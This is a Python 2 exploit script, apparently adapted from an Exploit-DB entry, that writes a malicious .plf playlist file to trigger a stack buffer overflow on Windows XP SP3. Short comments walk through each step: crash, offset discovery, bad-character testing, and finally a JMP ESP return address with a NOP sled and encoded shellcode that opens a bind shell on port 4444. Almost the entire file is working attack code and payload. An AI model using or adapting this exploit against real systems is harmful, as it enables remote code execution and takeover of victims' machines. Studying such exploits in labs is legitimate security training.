#!/usr/bin/python2

# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/26889
# Exploit tested on Windows XP Pro SP3 FR

# Bind shell on port 4444
shellcode =  b""
shellcode += b"\xbd\xb3\xa4\xc8\x27\xda\xda\xd9\x74\x24\xf4\x58\x31"
shellcode += b"\xc9\xb1\x53\x31\x68\x12\x83\xc0\x04\x03\xdb\xaa\x2a"
shellcode += b"\xd2\xe7\x5b\x28\x1d\x17\x9c\x4d\x97\xf2\xad\x4d\xc3"
shellcode += b"\x77\x9d\x7d\x87\xd5\x12\xf5\xc5\xcd\xa1\x7b\xc2\xe2"
shellcode += b"\x02\x31\x34\xcd\x93\x6a\x04\x4c\x10\x71\x59\xae\x29"
shellcode += b"\xba\xac\xaf\x6e\xa7\x5d\xfd\x27\xa3\xf0\x11\x43\xf9"
shellcode += b"\xc8\x9a\x1f\xef\x48\x7f\xd7\x0e\x78\x2e\x63\x49\x5a"
shellcode += b"\xd1\xa0\xe1\xd3\xc9\xa5\xcc\xaa\x62\x1d\xba\x2c\xa2"
shellcode += b"\x6f\x43\x82\x8b\x5f\xb6\xda\xcc\x58\x29\xa9\x24\x9b"
shellcode += b"\xd4\xaa\xf3\xe1\x02\x3e\xe7\x42\xc0\x98\xc3\x73\x05"
shellcode += b"\x7e\x80\x78\xe2\xf4\xce\x9c\xf5\xd9\x65\x98\x7e\xdc"
shellcode += b"\xa9\x28\xc4\xfb\x6d\x70\x9e\x62\x34\xdc\x71\x9a\x26"
shellcode += b"\xbf\x2e\x3e\x2d\x52\x3a\x33\x6c\x3b\x8f\x7e\x8e\xbb"
shellcode += b"\x87\x09\xfd\x89\x08\xa2\x69\xa2\xc1\x6c\x6e\xc5\xfb"
shellcode += b"\xc9\xe0\x38\x04\x2a\x29\xff\x50\x7a\x41\xd6\xd8\x11"
shellcode += b"\x91\xd7\x0c\x8f\x99\x7e\xff\xb2\x64\xc0\xaf\x72\xc6"
shellcode += b"\xa9\xa5\x7c\x39\xc9\xc5\x56\x52\x62\x38\x59\x4d\x2f"
shellcode += b"\xb5\xbf\x07\xdf\x93\x68\xbf\x1d\xc0\xa0\x58\x5d\x22"
shellcode += b"\x99\xce\x16\x24\x1e\xf1\xa6\x62\x08\x65\x2d\x61\x8c"
shellcode += b"\x94\x32\xac\xa4\xc1\xa5\x3a\x25\xa0\x54\x3a\x6c\x52"
shellcode += b"\xf4\xa9\xeb\xa2\x73\xd2\xa3\xf5\xd4\x24\xba\x93\xc8"
shellcode += b"\x1f\x14\x81\x10\xf9\x5f\x01\xcf\x3a\x61\x88\x82\x07"
shellcode += b"\x45\x9a\x5a\x87\xc1\xce\x32\xde\x9f\xb8\xf4\x88\x51"
shellcode += b"\x12\xaf\x67\x38\xf2\x36\x44\xfb\x84\x36\x81\x8d\x68"
shellcode += b"\x86\x7c\xc8\x97\x27\xe9\xdc\xe0\x55\x89\x23\x3b\xde"
shellcode += b"\xb9\x69\x61\x77\x52\x34\xf0\xc5\x3f\xc7\x2f\x09\x46"
shellcode += b"\x44\xc5\xf2\xbd\x54\xac\xf7\xfa\xd2\x5d\x8a\x93\xb6"
shellcode += b"\x61\x39\x93\x92"

#Step 1: Crash
buffer = b"A"*500

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

#Step 3: Check the offset
buffer = "A" * 260 + "BBBB" + "C"*(500-260-4)

#Step 4: Find bad chars (00 0a 1a
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = "A" * 260 + "BBBB" + badchars 


#Step 5: exploit -> JMP ESP at 6401CC7E
buffer = "A" * 260 + "\x7e\xcc\x01\x64" + "\x90"*30  + shellcode


file = open("05-exploit.plf", "wb")
file.write(buffer)
file.close()
